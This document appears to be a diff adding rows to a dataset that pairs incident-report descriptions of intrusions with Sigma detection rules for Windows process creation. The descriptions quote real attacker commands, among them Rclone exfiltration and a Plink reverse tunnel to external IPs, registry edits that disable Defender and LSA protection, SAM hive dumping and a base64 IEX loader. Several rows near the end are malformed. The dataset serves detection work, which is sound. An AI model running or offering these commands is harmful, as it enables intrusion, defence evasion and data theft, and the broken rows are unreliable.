+              - 'MD5=2da9152c0970500c697c1c9b4a9e0360'
+              - 'MD5=b5ba72034b8f44d431f55275bace9f8b'
+              - 'MD5=d6ed9101df0f24e27ff92ddab42dacca'
+              - 'MD5=3ed3cdb6d12aa1ac562ad185cdbf2d1d'
+              - 'MD5=5e083cd0143ae95a6cb79b68c07ca573'
+              - 'MD5=28caff93748cb84be70486e79f04c2df'
+              - 'MD5=9d4f12c30f9b500f896efd1800e4dd11'
+              - 'MD5=4586f7dd14271ad65a5fb696b393f4c0'
+              - 'MD5=86ba9dddbdf49215145b5bcd081d4011'
+              - 'MD5=9dce0a481343874ef9a36c9a825ef991'
+              - 'MD5=85890f62e231ad964b1fda7a674747ec'
+              - 'MD5=599be548da6441d7fe3e9a1bb8cb0833'
+              - 'MD5=9b0c7fd5763f66e9b8c7b457fce53f96'
+              - 'MD5=32d45718164205aec3e98e0223717d1d'
+              - 'MD5=6ff5f373ee7f794cd17db50704d00ddb'
+              - 'MD5=88efbdf41f0650f8f58a3053b0ca0459'
+              - 'MD5=ef915f61f861d1fb7cbde9afd2e7bd93'
+              - 'MD5=781fa16511a595757154b4304d2dd350'
+              - 'MD5=5018ec39be0e296f4fc8c8575bfa8486'
+              - 'MD5=f4a84d6f1caf0875b50135423d04139f'
+        - Image|endswith: '\PingCastle.exe'
+        - OriginalFileName: PingCastle.exe
+        - Product: 'Ping Castle'
+        - CommandLine|contains:
+              - '--scanner aclcheck'
+              - '--scanner antivirus'
+              - '--scanner computerversion'
+              - '--scanner foreignusers'
+              - '--scanner laps_bitlocker'
+              - '--scanner localadmin'
+              - '--scanner nullsession'
+              - '--scanner nullsession-trust'
+              - '--scanner oxidbindings'
+              - '--scanner remote'
+              - '--scanner share'
+              - '--scanner smb'
+              - '--scanner smb3querynetwork'
+              - '--scanner spooler'
+              - '--scanner startup'
+              - '--scanner zerologon'
+        - CommandLine|contains: '--no-enum-limit'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--level Full'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--server '
+    condition: selection",
+folder_06,"Rclone was used to collect and exfiltrate data from network shares, masquerading as a svchost executable. Exfiltration command example: svchost.exe --config svchost.conf --progress --no-check-certificate copy \\ServerName\C$\ShareName ftp1:/DomainName/FILES/C/ShareName. Three and a half hours into the intrusion, Rclone was used to collect and exfiltrate the contents of network shares for use in a double extortion demand. Data was exfiltrated to a remote server at 45.147.160.5:443. The attackers carefully disguised the Rclone executable to blend in with normal system processes.",,proc_creation_win_pua_rclone_execution.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_specific_options:
+        CommandLine|contains|all:
+            - '--config '
+            - '--no-check-certificate '
+            - ' copy '
+    selection_rclone_img:
+        - Image|endswith: '\rclone.exe'
+        - Description: 'Rsync for cloud storage'
+    selection_rclone_cli:
+        CommandLine|contains:
+            - 'pass'
+            - 'user'
+            - 'copy'
+            - 'sync'
+            - 'config'
+            - 'lsd'
+            - 'remote'
+            - 'ls'
+            - 'mega'
+            - 'pcloud'
+            - 'ftp'
+            - 'ignore-existing'
+            - 'auto-confirm'
+            - 'transfers'
+            - 'multi-thread-streams'
+            - 'no-check-certificate '
+    condition: selection_specific_options or all of selection_rclone_*",
+folder_07,"Registry modifications were part of a setup.bat script executed by threat actors. BitLocker registry keys added include: HKLM\SOFTWARE\Policies\Microsoft\FVE\ with EnableBDEWithNoTPM=1, UseAdvancedStartup=1, UseTPM=2, UseTPMKey=2, UseTPMKeyPIN=2, RecoveryKeyMessageSource=2, UseTPMPIN=2, and RecoveryKeyMessage with ransomware contact information. The modifications enable BitLocker encryption with advanced startup options and add a custom recovery message. The script used PowerShell commands to further configure BitLocker including Initialize-Tpm and enabling BitLocker features designed to prepare systems for full disk encryption and prevent recovery.",,proc_creation_win_reg_bitlocker.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains|all:
+            - 'REG'
+            - 'ADD'
+            - '\SOFTWARE\Policies\Microsoft\FVE'
+            - '/v'
+            - '/f'
+        CommandLine|contains:
+            - 'EnableBDEWithNoTPM'
+            - 'UseAdvancedStartup'
+            - 'UseTPM'
+            - 'UseTPMKey'
+            - 'UseTPMKeyPIN'
+            - 'RecoveryKeyMessageSource'
+            - 'UseTPMPIN'
+            - 'RecoveryKeyMessage'
+    condition: selection",
+folder_07,"Qbot used reg.exe to add Windows Defender folder exclusions: C:\Windows\system32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths /f /t REG_DWORD /v C:\ProgramData\Microsoft\Oweboiqnb /d 0 and C:\Windows\system32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths /f /t REG_DWORD /v C:\ProgramData\Microsoft\Oweboiqnb /d 0. These commands added exclusions for a folder named Oweboiqnb in the ProgramData directory, preventing Windows Defender from scanning files in that location as a defense evasion technique.",,proc_creation_win_reg_defender_exclusion.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\reg.exe'
+        CommandLine|contains:
+            - 'SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'
+            - 'SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths'
+        CommandLine|contains|all:
+            - 'ADD '
+            - '/t '
+            - 'REG_DWORD '
+            - '/v '
+            - '/d '
+            - '0'
+    condition: selection",
+folder_07,"Threat actors used batch scripts (fed1.bat, fed2.bat, fed3.bat) to disable WMI Autologger sessions for Defender, stop Defender services, remove Defender from startup and context menus, and disable Defender scheduled tasks. Specific registry modifications included setting Defender service start values to 4 (disabled), disabling real-time monitoring, stopping SpyNet reporting, and preventing sample submissions. A representative command: reg add HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f. The scripts appeared to be lifted from an existing source for defense evasion.",,proc_creation_win_reg_disable_defender_wmi_autologger.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\reg.exe'
+        - OriginalFileName: 'reg.exe'
+    selection_reg_path:
+        CommandLine|contains:
+            - '\Control\WMI\Autologger\DefenderApiLogger\Start'
+            - '\Control\WMI\Autologger\DefenderAuditLogger\Start'
+    selection_reg_add:
+        CommandLine|contains|all:
+            - 'add'
+            - '0'
+    filter_main_enable:
+        CommandLine|contains: '0x00000001'
+    condition: all of selection_* and not 1 of filter_main_*",
+folder_07,Threat actors attempted to enable Restricted Admin Mode by modifying the registry using two methods: PSExec command psexec \\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add hklm\\system\\currentcontrolset\\control\\lsa /f /v DisableRestrictedAdmin /t REG_DWORD /d 0 and PowerShell command using Invoke-WMIExec to run New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD. The goal was to enable Restricted Admin Mode which allows pass-the-hash RDP attacks where an attacker can establish an RDP session using just the NTLM hash without needing the actual password. Evidence of successful configuration was found in EventID 4624 logs showing Restricted Admin Mode set to Yes.,,proc_creation_win_reg_lsa_disable_restricted_admin.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        CommandLine|contains|all:
+            - '\System\CurrentControlSet\Control\Lsa\'
+            - 'DisableRestrictedAdmin'
+    condition: selection",
+folder_07,"Threat actor disabled LSA protection using the registry command: reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f. This was part of the threat actor's defense evasion techniques during the intrusion, aimed at disabling Local Security Authority (LSA) protected process light (PPL) protections.",,proc_creation_win_reg_lsa_ppl_protection_disabled.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\reg.exe'
+        - OriginalFileName: 'reg.exe'
+    selection_cli:
+        CommandLine|contains: 'SYSTEM\CurrentControlSet\Control\Lsa'
+        CommandLine|contains|all:
+            - ' add '
+            - ' /d 0'
+            - ' /v RunAsPPL '
+    condition: all of selection_*",
+folder_07,"Threat actors used a batch script named fodhelper_reg_hashes.bat to dump registry hives. The technique involves using the fodhelper.exe utility with registry key manipulation, adding entries to HKCU\software\classes\ms-settings\shell\open\command, and saving specific registry hives to files: reg.exe save hklm\sam c:\ProgramData\sam.save, reg.exe save hklm\security c:\ProgramData\security.save, reg.exe save hklm\system c:\ProgramData\system.save. The script uses /ve and /v flags to add and modify registry keys with DelegateExecute being a key part of the manipulation. After dumping the hives, the script deletes the modified registry keys. This method allows credential access by dumping sensitive registry hives containing system authentication information.",,proc_creation_win_reg_open_command.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_1:
+        CommandLine|contains|all:
+            - 'reg'
+            - 'add'
+            - 'hkcu\software\classes\ms-settings\shell\open\command'
+            - '/ve '
+            - '/d'
+    selection_2:
+        CommandLine|contains|all:
+            - 'reg'
+            - 'add'
+            - 'hkcu\software\classes\ms-settings\shell\open\command'
+            - '/v'
+            - 'DelegateExecute'
+    selection_3:
+        CommandLine|contains|all:
+            - 'reg'
+            - 'delete'
+            - 'hkcu\software\classes\ms-settings'
+    condition: 1 of selection_*",
+folder_07,"Threat actors made multiple registry modifications to enable and configure RDP including: increasing maximum RDP connections with REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp /t REG_DWORD /v MaxInstanceCount /d 0xffffffff /f, enabling RDP listener with REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp /t REG_DWORD /v fEnableWinStation /d 1 /f. Configuring terminal server settings to allow terminal server connections, enable concurrent sessions, allow multiple sessions per user, and set terminal services to auto-start. The modifications were part of lateral movement allowing threat actors to establish interactive administrative RDP sessions across different hosts in the network.",,proc_creation_win_reg_rdp_keys_tamper.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_main_img:
+        - Image|endswith: '\reg.exe'
+        - OriginalFileName: 'reg.exe'
+    selection_main_cli:
+        CommandLine|contains|all:
+            - ' add '
+            - '\CurrentControlSet\Control\Terminal Server'
+            - 'REG_DWORD'
+            - ' /f'
+    selection_values_1:
+        CommandLine|contains|all:
+            - 'Licensing Core'
+            - 'EnableConcurrentSessions'
+    selection_values_2:
+        CommandLine|contains:
+            - 'WinStations\RDP-Tcp'
+            - 'MaxInstanceCount'
+            - 'fEnableWinStation'
+            - 'TSUserEnabled'
+            - 'TSEnabled'
+            - 'TSAppCompat'
+            - 'IdleWinStationPoolCount'
+            - 'TSAdvertise'
+            - 'AllowTSConnections'
+            - 'fSingleSessionPerUser'
+            - 'fDenyTSConnections'
+    condition: all of selection_main_* and 1 of selection_values_*",
+folder_07,"Threat actor used PowerShell to modify Windows Defender settings including disabling Behavior Monitoring, setting Severe Threat default action to Allow, disabling Real-time Monitoring, and adding exclusion path for C:\Windows. The PowerShell command used was: try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath C:\\Windows -Force -AsJob} catch {}. These actions were part of the threat actor's defense evasion techniques during the intrusion.",,proc_creation_win_reg_windows_defender_tamper.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_root_img:
+        - Image|endswith: '\reg.exe'
+        - OriginalFileName: 'reg.exe'
+    selection_root_path:
+        CommandLine|contains:
+            - 'SOFTWARE\Microsoft\Windows Defender\'
+            - 'SOFTWARE\Policies\Microsoft\Windows Defender Security Center'
+            - 'SOFTWARE\Policies\Microsoft\Windows Defender\'
+    selection_dword_0:
+        CommandLine|contains|all:
+            - ' add '
+            - 'd 0'
+        CommandLine|contains:
+            - 'DisallowExploitProtectionOverride'
+            - 'EnableControlledFolderAccess'
+            - 'MpEnablePus'
+            - 'PUAProtection'
+            - 'SpynetReporting'
+            - 'SubmitSamplesConsent'
+            - 'TamperProtection'
+    selection_dword_1:
+        CommandLine|contains|all:
+            - ' add '
+            - 'd 1'
+        CommandLine|contains:
+            - 'DisableAccess'
+            - 'DisableAntiSpyware'
+            - 'DisableAntiSpywareRealtimeProtection'
+            - 'DisableAntiVirus'
+            - 'DisableAntiVirusSignatures'
+            - 'DisableArchiveScanning'
+            - 'DisableBehaviorMonitoring'
+            - 'DisableBlockAtFirstSeen'
+            - 'DisableCloudProtection'
+            - 'DisableConfig'
+            - 'DisableEnhancedNotifications'
+            - 'DisableIntrusionPreventionSystem'
+            - 'DisableIOAVProtection'
+            - 'DisableNetworkProtection'
+            - 'DisableOnAccessProtection'
+            - 'DisablePrivacyMode'
+            - 'DisableRealtimeMonitoring'
+            - 'DisableRoutinelyTakingAction'
+            - 'DisableScanOnRealtimeEnable'
+            - 'DisableScriptScanning'
+            - 'DisableSecurityCenter'
+            - 'Notification_Suppress'
+            - 'SignatureDisableUpdateOnStartupWithoutEngine'
+    condition: all of selection_root_* and 1 of selection_dword_*",
+folder_07,"The threat actor created a script that uses the registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList to hide a user account from the login screen. The script creates a user named Support and then adds a registry value: reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /t REG_DWORD /f /d 0 /v Support. Setting the value to 0 prevents the Support account from being displayed on the login screen, effectively hiding it from view while still maintaining system access.",,proc_creation_win_registry_special_accounts_hide_user.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\reg.exe'
+        CommandLine|contains|all:
+            - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+            - 'add'
+            - '/v'
+            - '/d 0'
+    condition: selection",
+folder_07,"After dropping 1.dll (Cobalt Strike) on the domain controller, the threat actor executed it using: rundll32.exe 1.dll, DllRegisterServer. This command was used to register or execute the Cobalt Strike DLL on the compromised domain controller. The execution method suggests an attempt to load and initialize the malicious DLL using the standard Windows DLL registration mechanism.",,proc_creation_win_regsvr32_dllregisterserver_exec.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_image:
+        - Image|endswith: '\regsvr32.exe'
+        - OriginalFileName: 'REGSVR32.EXE'
+    selection_cmdline:
+        CommandLine|contains:
+            - ' /s '
+            - ' /e '
+    filter_main_paths:
+        - CommandLine|contains:
+              - ':\Program Files (x86)'
+              - ':\Program Files\'
+              - ':\Windows\System32\'
+              - ':\Windows\SysWOW64\'
+        - CurrentDirectory|contains:
+              - ':\Program Files (x86)'
+              - ':\Program Files\'
+              - ':\Windows\System32\'
+              - ':\Windows\SysWOW64\'
+    filter_main_other_flags:
+        CommandLine|contains:
+            - ' /i:'
+            - '/U '
+    filter_main_rpcproxy:
+        ParentCommandLine|endswith: ':\Windows\System32\RpcProxy\RpcProxy.dll'
+        CommandLine: 'regsvr32 /s rpcproxy.dll'
+    condition: all of selection_* and not 1 of filter_main_*",
+folder_08,Qbot DLLs were created remotely from the beachhead host and saved in the administrative C$ share of other hosts within the network. Zeek SMB file data confirmed the file transfers. A local service was registered on targeted systems to execute the Qbot DLL using regsvr32.exe. Suricata signatures identified the remote file creation and service registration: ET RPC DCERPC SVCCTL - Remote Service Control Manager Access and ET POLICY SMB Executable File Transfer.,,proc_creation_win_regsvr32_remote_share.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\regsvr32.exe'
+        - OriginalFileName: '\REGSVR32.EXE'
+    selection_cli:
+        CommandLine|contains: ' \\\\'
+    condition: all of selection_*",
+folder_08,"Initial access involved a weaponized Microsoft Word document with a macro that downloaded a binary file compareForFor.jpg to c:\users\public and used REGSVR32 to execute this DLL. The downloaded file was actually a DLL despite the .jpg extension. The DLL was loaded via RunDll32 process with two DLLs loaded: D574.dll and D8B3.dll. D8B3.dll was injected into the Winlogon process at high integrity. Suspicious characteristics included invalid certificates for the DLLs, no populated metadata for the DLLs, and unusual process hierarchy during execution.",,proc_creation_win_regsvr32_susp_extensions.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\regsvr32.exe'
+        - OriginalFileName: 'REGSVR32.EXE'
+    selection_cli:
+        CommandLine|endswith:
+            - '.bin'
+            - '.bmp'
+            - '.cr2'
+            - '.dat'
+            - '.eps'
+            - '.gif'
+            - '.ico'
+            - '.jpeg'
+            - '.jpg'
+            - '.nef'
+            - '.orf'
+            - '.png'
+            - '.raw'
+            - '.sr2'
+            - '.temp'
+            - '.tif'
+            - '.tiff'
+            - '.tmp'
+            - '.rtf'
+            - '.txt'
+    condition: all of selection_*",
+folder_08,"Threat actor downloaded AnyDesk using PowerShell: powershell -c (New-Object Net.WebClient).DownloadFile('http://download.anydesk.com/AnyDesk.msi', 'AnyDesk.msi'). A service was installed to ensure AnyDesk remained available after server restarts with Windows System event 7045 showing service creation with AnyDeskMSI.exe set to auto-start. Connected via IP 92.51.2[.]27 with hostname WIN-EKIHV2OQQP8. AnyDesk was configured with a preset password and provided the threat actor with persistent remote access to drop tools, enumerate infrastructure, access credentials, and exfiltrate and encrypt data.",,proc_creation_win_remote_access_tools_anydesk_susp_exec.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith:
+              - '\AnyDesk.exe'
+              - '\AnyDeskMSI.exe'
+        - Description: AnyDesk
+        - Product: AnyDesk
+        - Company: AnyDesk Software GmbH
+    filter:
+        Image|contains:
+            - '\AppData\'
+            - 'Program Files (x86)\AnyDesk'
+            - 'Program Files\AnyDesk'
+    condition: selection and not filter",
+folder_08,"Threat actor downloaded AnyDesk using PowerShell: powershell -c (New-Object Net.WebClient).DownloadFile('http://download.anydesk.com/AnyDesk.msi', 'AnyDesk.msi'). A service was installed to ensure AnyDesk remained available after server restarts with Windows System event 7045 showing service creation with AnyDeskMSI.exe set to auto-start. Connected via IP 92.51.2[.]27 with hostname WIN-EKIHV2OQQP8. AnyDesk was configured with a preset password and provided the threat actor with persistent remote access to drop tools, enumerate infrastructure, access credentials, and exfiltrate and encrypt data.",,proc_creation_win_remote_access_tools_anydesk.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith:
+              - '\AnyDesk.exe'
+              - '\AnyDeskMSI.exe'
+        - Description: AnyDesk
+        - Product: AnyDesk
+        - Company: AnyDesk Software GmbH
+    condition: selection",
+folder_08,"AdFind continues to be seen across majority of breaches and is used for domain trust discovery to plan out subsequent steps in the attack chain. Threat actors use AdFind for gathering network information including person objects, computer systems, domain trusts, subnets, and domain controllers. Observed commands from previous reports include: adfind.exe -gcb -sc trustdmp, adfind.exe -f (objectcategory=group), adfind.exe -subnets -f (objectCategory=subnet), adfind.exe -f (objectcategory=organizationalUnit), adfind.exe -f objectcategory=computer, adfind.exe -f (objectcategory=person).",,proc_creation_win_renamed_adfind.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_1:
+        CommandLine|contains:
+            - 'domainlist'
+            - 'trustdmp'
+            - 'dcmodes'
+            - 'adinfo'
+            - ' dclist '
+            - 'computer_pwdnotreqd'
+            - 'objectcategory='
+            - '-subnets -f'
+            - 'name=""Domain Admins""'
+            - '-sc u:'
+            - 'domainncs'
+            - 'dompol'
+            - ' oudmp '
+            - 'subnetdmp'
+            - 'gpodmp'
+            - 'fspdmp'
+            - 'users_noexpire'
+            - 'computers_active'
+            - 'computers_pwdnotreqd'
+    selection_2:
+        Hashes|contains:
+            - 'IMPHASH=BCA5675746D13A1F246E2DA3C2217492'
+            - 'IMPHASH=53E117A96057EAF19C41380D0E87F1C2'
+            - 'IMPHASH=d144de8117df2beceaba2201ad304764'
+            - 'IMPHASH=12ce1c0f3f5837ecc18a3782408fa975'
+            - 'IMPHASH=4fbf3f084fbbb2470b80b2013134df35'
+            - 'IMPHASH=49b639b4acbecc49d72a01f357aa4930'
+            - 'IMPHASH=680dad9e300346e05a85023965867201'
+            - 'IMPHASH=21aa085d54992511b9f115355e468782'
+    selection_3:
+        OriginalFileName: 'AdFind.exe'
+    filter:
+        Image|endswith: '\AdFind.exe'
+    condition: 1 of selection* and not filter",
+folder_08,"Threat actors used AutoHotkey (AHK) as part of their keylogging strategy by renaming the AutoHotkey executable to module.exe. The executable module.exe is a renamed binary of AutoHotkey executed with a script named module.ahk. Purpose was to create a keylogger that captured keyboard layout, recorded pressed keys, and saved keystrokes to a registry key. Execution command: module.exe was run with module.ahk as a command-line parameter. A scheduled task named MicrosoftEdgeUpdateTaskMachineUC was created to run the keylogger for persistence.",,proc_creation_win_renamed_autohotkey.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Product|contains: 'AutoHotkey'
+        - Description|contains: 'AutoHotkey'
+        - OriginalFileName:
+              - 'AutoHotkey.exe'
+              - 'AutoHotkey.rc'
+    filter:
+        - Image|endswith:
+              - '\AutoHotkey.exe'
+              - '\AutoHotkey32.exe'
+              - '\AutoHotkey32_UIA.exe'
+              - '\AutoHotkey64.exe'
+              - '\AutoHotkey64_UIA.exe'
+              - '\AutoHotkeyA32.exe'
+              - '\AutoHotkeyA32_UIA.exe'
+              - '\AutoHotkeyU32.exe'
+              - '\AutoHotkeyU32_UIA.exe'
+              - '\AutoHotkeyU64.exe'
+              - '\AutoHotkeyU64_UIA.exe'
+        - Image|contains: '\AutoHotkey'
+    condition: selection and not filter",
+folder_08,"PingCastle was used by the threat actor as an Active Directory auditing tool during their intrusion. The tool was executed on a domain controller with the command: pingcastle.exe --healthcheck --level Full. PingCastle is described as an active directory auditing tool used for reconnaissance and security assessment purposes. The threat actor ran this tool as part of their discovery phase, likely to gather information about the Active Directory environment's security configuration and potential vulnerabilities.",,proc_creation_win_renamed_pingcastle.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - OriginalFileName:
+              - 'PingCastleReporting.exe'
+              - 'PingCastleCloud.exe'
+              - 'PingCastle.exe'
+        - CommandLine|contains:
+              - '--scanner aclcheck'
+              - '--scanner antivirus'
+              - '--scanner computerversion'
+              - '--scanner foreignusers'
+              - '--scanner laps_bitlocker'
+              - '--scanner localadmin'
+              - '--scanner nullsession'
+              - '--scanner nullsession-trust'
+              - '--scanner oxidbindings'
+              - '--scanner remote'
+              - '--scanner share'
+              - '--scanner smb'
+              - '--scanner smb3querynetwork'
+              - '--scanner spooler'
+              - '--scanner startup'
+              - '--scanner zerologon'
+        - CommandLine|contains: '--no-enum-limit'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--level Full'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--server '
+    filter_main_img:
+        Image|endswith:
+            - '\PingCastleReporting.exe'
+            - '\PingCastleCloud.exe'
+            - '\PingCastle.exe'
+    condition: selection and not 1 of filter_main_*",
+folder_08,"Threat actor downloaded a file named ekern.exe which was actually a renamed version of Plink. They used a batch script FXS.bat to establish SSH connections for port forwarding. Key command used: echo y | c:\Windows\temp\ekern.exe -ssh -P 443 -l admin1 -pw [password] -R 23.81.246.84:49800:127.0.0.1:3389 23.81.246.84. Renamed Plink to ekern.exe to stay under the radar, forwarded RDP traffic through SSH tunnel, and used non-standard port 443 for SSH connection. The tunneling allowed establishing reverse SSH connections, creating RDP access to internal servers, and proxying traffic between their server and target hosts. The name ekern.exe was chosen to resemble a legitimate ESET component.",,proc_creation_win_renamed_plink.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - OriginalFileName: 'Plink'
+        - CommandLine|contains|all:
+              - ' -l forward'
+              - ' -P '
+              - ' -R '
+    filter:
+        Image|endswith: '\plink.exe'
+    condition: selection and not filter",
+folder_08,"After dropping 1.dll (Cobalt Strike) on the domain controller, the threat actor executed it using: rundll32.exe 1.dll, DllRegisterServer. This command was used to register or execute the Cobalt Strike DLL on the compromised domain controller. The execution method suggests an attempt to load and initialize the malicious DLL using the standard Windows DLL registration mechanism.",,proc_creation_win_rundll32_dllregisterserver.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_image:
+        - Image|endswith: '\rundll32.exe'
+        - OriginalFileName: 'RUNDLL32.EXE'
+    selection_cmdline:
+        CommandLine|contains: 'DllRegisterServer'
+    filter_main_legit_paths:
+        CommandLine|contains:
+            - ':\Program Files (x86)'
+            - ':\Program Files\'
+            - ':\Windows\System32\'
+            - ':\Windows\SysWOW64\'
+    condition: all of selection_* and not 1 of filter_main_*",
+folder_08,"The BumbleBee malware was executed via rundll32.exe with the command: C:\Windows\System32\rundll32.exe tamirlan.dll,EdHVntqdWt. The malware used WMI and COM function calls to start processes, specifically targeting three potential injection processes: C:\Program Files\Windows Mail\wabmig.exe, C:\Program Files\Windows Mail\wab.exe, and C:\Program Files\Windows Photo Viewer\ImagingDevices.exe. Processes spawned were not direct child processes of rundll32 but instead children of WmiPrvSE.exe. The malware used CreateRemoteThread to execute code in rundll32.exe and created named pipes for inter-process communication. This technique helps evade parent/child process heuristics and allows injecting code into legitimate processes.",,proc_creation_win_rundll32_parent_explorer.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_parent:
+        ParentImage|endswith: '\explorer.exe'
+    selection_img:
+        - Image|endswith: '\rundll32.exe'
+        - OriginalFileName: 'RUNDLL32.EXE'
+    filter_main_generic:
+        - CommandLine|contains: ' C:\Windows\System32\'
+        - CommandLine|endswith: ' -localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617'
+    condition: all of selection_* and not 1 of filter_main_*",
+folder_09,"Based on referenced DFIR report URLs, Qbot threat actors created scheduled tasks that execute files from C:\Users\<USER>\AppData\Local directories with SYSTEM privileges. These tasks were used for persistence and to execute malicious payloads from user profile directories, often with elevated permissions to maintain access and execute additional malicious activities.",,proc_creation_win_schtasks_appdata_local_system.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        Image|endswith: '\schtasks.exe'
+        CommandLine|contains|all:
+            - '/Create'
+            - '/RU'
+            - '/TR'
+            - 'C:\Users\'
+            - '\AppData\Local\'
+        CommandLine|contains:
+            - 'NT AUT'
+            - ' SYSTEM '
+    filter:
+        ParentImage|contains|all:
+            - '\AppData\Local\Temp\'
+            - 'TeamViewer_.exe'
+        Image|endswith: '\schtasks.exe'
+        CommandLine|contains: '/TN TVInstallRestore'
+    condition: selection and not filter",
+folder_09,"Threat actors used batch scripts (fed1.bat, fed2.bat, fed3.bat) to disable WMI Autologger sessions for Defender, stop Defender services, remove Defender from startup and context menus, and disable Defender scheduled tasks. This was part of their defense evasion strategy where adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities. The scripts appeared to be lifted from an existing source for defense evasion.",,proc_creation_win_schtasks_disable.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\schtasks.exe'
+        CommandLine|contains|all:
+            - '/Change'
+            - '/TN'
+            - '/disable'
+        CommandLine|contains:
+            - '\Windows\BitLocker'
+            - '\Windows\ExploitGuard'
+            - '\Windows\ExploitGuard\ExploitGuard MDM policy Refresh'
+            - '\Windows\SystemRestore\SR'
+            - '\Windows\UpdateOrchestrator\'
+            - '\Windows\Windows Defender\'
+            - '\Windows\WindowsBackup\'
+            - '\Windows\WindowsUpdate\'
+    condition: selection",
+folder_09,Threat actors created scheduled tasks with GUID-like names as part of their persistence strategy. Examples from DFIR reports include tasks named with GUIDs like {97F2F70B-10D1-4447-A2F3-9B070C86E261} which executed PowerShell commands to decode and execute base64 encoded payloads stored in the registry. This technique helps blend malicious tasks with legitimate system tasks that sometimes use GUID naming conventions.,,proc_creation_win_schtasks_guid_task_name.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_img:
+        Image|endswith: '\schtasks.exe'
+        CommandLine|contains: '/Create '
+    selection_tn:
+        CommandLine|contains:
+            - '/TN ""{'
+            - ""/TN '{",
+folder_09,,,"            - """"/TN {""",,
+selection_end:,,
+CommandLine|contains:,,
+- '} ',,
+"    condition: all of selection_*""",,folder_09,,,"            - '}""""'",,
+folder_09,,,"            - """"}'""",,
+folder_09,"From referenced DFIR report, threat actors potentially used SSH tunneling for persistence and command and control. They likely created scheduled tasks that call OpenSSH tools (sshd.exe or ssh.exe) to establish reverse SSH tunnels to attacker servers, providing persistent remote access and bypassing network security controls.",,proc_creation_win_schtasks_openssh_tunnelling.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_img:
+        - Image|endswith: '\schtasks.exe'
+        - OriginalFileName: 'schtasks.exe'
+    selection_cli_sshd:
+        CommandLine|contains|all:
+            - ' /create '
+            - 'sshd.exe'
+            - '-f'
+    selection_cli_ssh:
+        CommandLine|contains|all:
+            - ' /create '
+            - 'ssh.exe'
+            - '-i'
+    condition: selection_img and 1 of selection_cli_*",
+folder_09,"Threat actors created a scheduled task with a GUID name {97F2F70B-10D1-4447-A2F3-9B070C86E261} that executed a PowerShell command: cmd /c start /min \\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\Pvoeooxf).yzbbvhhdypa))). This task executed every 30 minutes and decoded base64 encoded payload stored in the Windows Registry using PowerShell for persistence and payload execution.""",,proc_creation_win_schtasks_reg_loader_encoded.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_img:
+        - Image|endswith: '\schtasks.exe'
+        - OriginalFileName: 'schtasks.exe'
+    selection_cli_create:
+        CommandLine|contains: '/Create'
+    selection_cli_encoding:
+        CommandLine|contains:
+            - 'FromBase64String'
+            - 'encodedcommand'
+    selection_cli_get:
+        CommandLine|contains:
+            - 'Get-ItemProperty'
+            - ' gp '
+    selection_cli_hive:
+        CommandLine|contains:
